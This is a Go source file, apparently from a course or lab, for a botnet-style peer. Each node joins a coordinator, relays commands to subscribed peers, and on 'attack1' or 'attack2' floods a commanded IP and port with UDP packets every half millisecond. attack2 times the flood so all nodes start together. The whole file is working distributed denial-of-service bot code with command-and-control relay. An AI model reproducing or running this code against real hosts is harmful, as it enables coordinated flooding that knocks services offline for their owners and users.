package main

import(
	"fmt"
	"os"
	"time"
    "io/ioutil"
    "encoding/gob"
    "bytes"
    "net"
    "strconv"
    "math/rand"
)


//Structs, global variables and general functions--------------------
//-------------------------------------------------------------------
type Node struct{
    ID int
    T time.Time
    IP string
    Port int
}

type Message struct{
    N Node
	Command string
}

func checkError(err error) bool{
	if err!=nil{
		fmt.Println("Erro: ", err)
        return true
	}
    return false
}

func printNode(str string, node Node){
    fmt.Println(str, node.ID, node.IP, node.Port, node.T)
}

var node Node
var ServConn *net.UDPConn
var CliConn[] *net.UDPConn
var index int

//State serializer part----------------------------------------------
//-------------------------------------------------------------------
var fileName string
func printState(){
    printNode("State:", node)
}

func initState(){
    index,_ = strconv.Atoi(os.Args[1])
    fileName = "Client"+strconv.Itoa(index)
    CliConn = make([]*net.UDPConn,0)
    conn:=connect("127.0.0.1", 10000)
    node = Node{0,time.Now().UTC(),"",10000+index}
    if _, err := os.Stat(fileName); os.IsNotExist(err) {
        sendMsg(Message{node,"Join"}, conn)
        msg,_:=doServerJob(conn)
        node = msg.N
        writeState()
        printState()
    }else{
        byteArray,err := ioutil.ReadFile(fileName)
        checkError(err)
        err=gob.NewDecoder(bytes.NewReader(byteArray)).Decode(&node)
        checkError(err)
        sendMsg(Message{node,"Join"}, conn)
        printState()
    }
    initServer()
    msg,_:=doServerJob(conn)
    if(msg.N.Port!=node.Port){
        conn = connect(msg.N.IP, msg.N.Port)
        sendMsg(Message{node,"Subscribe"}, conn)
    }
}

func writeState(){
    var f *os.File
    var err error
    f,err=os.OpenFile(fileName, os.O_WRONLY|os.O_CREATE|os.O_TRUNC,0)
    var buf bytes.Buffer
    e:= gob.NewEncoder(&buf)
    err=e.Encode(node)
    checkError(err)
    _,err=f.Write(buf.Bytes())
    checkError(err)
    f.Close()
}

//Web part-----------------------------------------------------------
//-------------------------------------------------------------------
func doServerJob(conn *net.UDPConn) (Message,net.Addr){
    recBuffer := make([]byte, 1024)
	n,addr,servErr := conn.ReadFromUDP(recBuffer)
	checkError(servErr)
	msg := Message{}
    servErr = gob.NewDecoder(bytes.NewReader(recBuffer[:n])).Decode(&msg)
    checkError(servErr)
    printNode("Receiving Message "+addr.String()+" "+msg.Command, msg.N)
    return msg,addr
}

func getByteArray(msg Message)[]byte{
    var buf bytes.Buffer
    e:= gob.NewEncoder(&buf)
    var err error
    err = e.Encode(msg)
    checkError(err)
    //printNode("Encoding Message "+msg.Command, msg.N)
    return buf.Bytes()
}

func sendMsg(msg Message, conn *net.UDPConn){
    //fmt.Println("Sending Message To "+conn.RemoteAddr().String())
    _,err := conn.Write(getByteArray(msg))
    checkError(err)
}

func sendMsgTo(msg Message, conn *net.UDPConn, addr net.Addr){
    //fmt.Println("Sending Message To "+addr.String())
    _,err := conn.WriteTo(getByteArray(msg),addr)
    checkError(err)
}

func initServer(){
	ServerAddr,servErr := net.ResolveUDPAddr("udp", node.IP+":"+strconv.Itoa(node.Port))
    checkError(servErr)
    /* Now listen at selected port */
    ServConn, servErr = net.ListenUDP("udp", ServerAddr)
    checkError(servErr)
    fmt.Println("Listening in udp:", node.IP+":"+strconv.Itoa(node.Port))
}

func runServer(){
    for{
        msg,addr:=doServerJob(ServConn)
        takeAction(msg, ServConn, addr)
    }
}

func connect(ip string, port int)*net.UDPConn{
    remoteAddr,clientErr := net.ResolveUDPAddr("udp",ip+":"+strconv.Itoa(port))
    checkError(clientErr)
    LocalAddr, clientErr := net.ResolveUDPAddr("udp", "127.0.0.1:0")
    checkError(clientErr)
    conn, clientErr := net.DialUDP("udp", LocalAddr, remoteAddr)
    checkError(clientErr)
    return conn
}

//Mensage interpreter part-------------------------------------------
//-------------------------------------------------------------------
func takeAction(msg Message, conn *net.UDPConn, addr net.Addr){
    if msg.Command=="Subscribe" {
        CliConn=append(CliConn, connect(msg.N.IP, msg.N.Port))
    } else{
        if msg.Command=="attack1" {
            go attack1(connect(msg.N.IP, msg.N.Port))
        } else if msg.Command=="attack2" {
            go attack2(msg.N.T,connect(msg.N.IP, msg.N.Port))
        }
        time.Sleep(time.Duration(50+rand.Int()%101)*time.Millisecond)
        for _,conn := range CliConn {
            sendMsg(msg, conn)
        }
    }
}

//Attack-------------------------------------------------------------
//-------------------------------------------------------------------
func attack1(conn *net.UDPConn){
    msg := Message{node, "You got pwned"}
    i:=1
    ticker := time.NewTicker(time.Millisecond/2)
    for _ = range ticker.C {
        msg.N.T=time.Now().UTC()
        msg.N.ID=i
        sendMsg(msg, conn)
        i++
    }
}

func attack2(t time.Time, conn *net.UDPConn){
    time.Sleep(t.Sub(time.Now().UTC()))
    ticker := time.NewTicker(time.Millisecond/2)
    msg := Message{node, "You got pwned"}
    i := 1
    for _ = range ticker.C {
        msg.N.T=time.Now().UTC()
        msg.N.ID=i
        sendMsg(msg, conn)
        i++
    }
}

func main(){
    initState()
    runServer()
}
